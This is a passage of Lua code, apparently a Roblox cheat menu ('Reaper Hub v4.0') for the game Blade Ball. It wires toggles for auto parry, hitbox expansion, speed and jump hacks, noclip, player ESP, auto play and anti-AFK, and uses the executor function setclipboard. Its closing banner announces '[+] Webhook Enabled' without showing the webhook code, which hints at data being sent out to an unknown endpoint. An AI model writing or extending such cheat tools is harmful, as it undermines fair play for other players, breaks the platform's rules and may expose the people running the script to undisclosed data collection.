    ShaderState.MoonGlowEnabled = true
end

local function disableMoonGlow()
    local bloom = Lighting:FindFirstChild("MoonBloom")
    if bloom then bloom:Destroy() end
    local atmo = Lighting:FindFirstChild("MoonAtmosphere")
    if atmo then atmo:Destroy() end
    ShaderState.MoonGlowEnabled = false
    if not ShaderState.RainEnabled and not ShaderState.SnowEnabled and not ShaderState.AuroraEnabled then
        restoreOriginalLighting()
    end
end

-- ========================================
-- CREATE TABS
-- ========================================

local MainTab = CreateTab("Main", "[M]")
local PlayTab = CreateTab("Play", "[P]")
local ESPTab = CreateTab("ESP", "[E]")
local PingFPSTab = CreateTab("Ping|FPS", "[#]")
local ShadersTab = CreateTab("Shaders", "[S]")
local MiscTab = CreateTab("Misc", "[+]")

-- MAIN TAB
local CombatSection = MainTab:AddSection("Combat")
CombatSection:AddToggle({Title = "Auto Parry", Default = false, Callback = function(state) if state then Features.AutoParry:Start() else Features.AutoParry:Stop() end end})
CombatSection:AddSlider({Title = "Parry Timing", Min = 25, Max = 150, Default = 75, Callback = function(value) Features.AutoParry:SetDistance(value / 100) end})
CombatSection:AddToggle({Title = "Auto Use Ability", Default = false, Callback = function(state) if state then Features.AutoUseAbility:Start() else Features.AutoUseAbility:Stop() end end})
CombatSection:AddToggle({Title = "Manual Spam", Default = false, Callback = function(state) if state then Features.ManualSpam:Start() else Features.ManualSpam:Stop() end end})

local HitboxSection = MainTab:AddSection("Hitbox")
HitboxSection:AddToggle({Title = "Hitbox Expander", Default = false, Callback = function(state) if state then Features.HitboxExpander:Start() else Features.HitboxExpander:Stop() end end})
HitboxSection:AddSlider({Title = "Hitbox Size", Min = 5, Max = 20, Default = 10, Callback = function(value) Features.HitboxExpander.Size = value end})

-- PLAY TAB
local MovementSection = PlayTab:AddSection("Movement")
MovementSection:AddToggle({Title = "Speed Boost", Default = false, Callback = function(state) if state then Features.Speed:Start() else Features.Speed:Stop() end end})
MovementSection:AddSlider({Title = "Speed Value", Min = 16, Max = 100, Default = 50, Callback = function(value) Features.Speed.Value = value Features.Speed:Update() end})
MovementSection:AddToggle({Title = "Jump Boost", Default = false, Callback = function(state) if state then Features.Jump:Start() else Features.Jump:Stop() end end})
MovementSection:AddSlider({Title = "Jump Power", Min = 50, Max = 200, Default = 100, Callback = function(value) Features.Jump.Value = value Features.Jump:Update() end})
MovementSection:AddToggle({Title = "Infinite Jump", Default = false, Callback = function(state) if state then Features.InfiniteJump:Start() else Features.InfiniteJump:Stop() end end})
MovementSection:AddToggle({Title = "Noclip", Default = false, Callback = function(state) if state then Features.Noclip:Start() else Features.Noclip:Stop() end end})

local AutoSection = PlayTab:AddSection("Auto Play")
AutoSection:AddToggle({Title = "Auto Play", Default = false, Callback = function(state) Features.AutoPlay.Enabled = state end})
AutoSection:AddDropdown({Title = "Play Style", Options = {"Aggressive", "Balanced", "Defensive"}, Default = "Balanced", Callback = function(value) Features.AutoPlay.Style = value end})

-- ESP TAB
local ESPSection = ESPTab:AddSection("ESP Options")
ESPSection:AddToggle({Title = "Ball ESP", Default = false, Callback = function(state) if state then Features.BallESP:Start() else Features.BallESP:Stop() end end})
ESPSection:AddToggle({Title = "Player ESP", Default = false, Callback = function(state) if state then Features.ESP:Start() else Features.ESP:Stop() end end})
ESPSection:AddButton({Title = "Refresh All ESP", Callback = function()
    if Features.ESP.Enabled then Features.ESP:Stop() task.wait(0.1) Features.ESP:Start() end
    if Features.BallESP.Enabled then Features.BallESP:Stop() task.wait(0.1) Features.BallESP:Start() end
end})

local VisualsSection = ESPTab:AddSection("Visuals")
VisualsSection:AddToggle({Title = "Fullbright", Default = false, Callback = function(state) if state then Features.Fullbright:Start() else Features.Fullbright:Stop() end end})

-- PING | FPS TAB
local PerformanceSection = PingFPSTab:AddSection("Performance")
local fpsLabel = PerformanceSection:AddLabel("FPS: 0")
local pingLabel = PerformanceSection:AddLabel("Ping: 0ms")

RunService.RenderStepped:Connect(function()
    local fps = math.floor(1 / RunService.RenderStepped:Wait())
    fpsLabel:Set("FPS: " .. fps)
    
    local ping = 0
    pcall(function()
        ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
    end)
    pingLabel:Set("Ping: " .. ping .. "ms")
end)

local BoostSection = PingFPSTab:AddSection("FPS Boost")
BoostSection:AddToggle({Title = "FPS Booster", Default = false, Callback = function(state) if state then Features.FPSBoost:Start() else Features.FPSBoost:Stop() end end})
BoostSection:AddLabel("Reduces graphics quality")
BoostSection:AddLabel("for better performance")

-- SHADERS TAB
local WeatherSection = ShadersTab:AddSection("Weather Effects")
WeatherSection:AddToggle({Title = "Rain", Default = false, Callback = function(state) if state then enableRain() else disableRain() end end})
WeatherSection:AddToggle({Title = "Snow", Default = false, Callback = function(state) if state then enableSnow() else disableSnow() end end})

local SkySection = ShadersTab:AddSection("Sky Effects")
SkySection:AddToggle({Title = "Aurora Borealis", Default = false, Callback = function(state) if state then enableAurora() else disableAurora() end end})
SkySection:AddToggle({Title = "Moon Glow", Default = false, Callback = function(state) if state then enableMoonGlow() else disableMoonGlow() end end})

local ResetSection = ShadersTab:AddSection("Reset")
ResetSection:AddButton({Title = "Reset All Shaders", Callback = function()
    disableRain()
    disableSnow()
    disableAurora()
    disableMoonGlow()
    restoreOriginalLighting()
end})

-- MISC TAB
local UtilSection = MiscTab:AddSection("Utility")
UtilSection:AddToggle({Title = "Anti-AFK", Default = true, Callback = function(state) Features.AntiAFK.Enabled = state end})
UtilSection:AddButton({Title = "Rejoin Server", Callback = function() game:GetService("TeleportService"):Teleport(game.PlaceId, Player) end})
UtilSection:AddButton({Title = "Copy Server Link", Callback = function()
    local jobId = game.JobId
    if jobId ~= "" then
        if setclipboard then
            setclipboard("roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId)
        end
    end
end})

local InfoSection = MiscTab:AddSection("Info")
InfoSection:AddLabel("Reaper Hub v4.0")
InfoSection:AddLabel("Pure Black Edition")

-- Notification
pcall(function()
    StarterGui:SetCore("SendNotification", {
        Title = "Reaper Hub",
        Text = "Loaded successfully!",
        Duration = 3
    })
end)

print("========================================")
print("[R] REAPER HUB | BLADEBALL v4.0")
print("[+] Pure Black Design")
print("[+] Smooth 3D Animations")
print("[+] Shaders + FPS Boost")
print("[+] Webhook Enabled")
print("========================================")
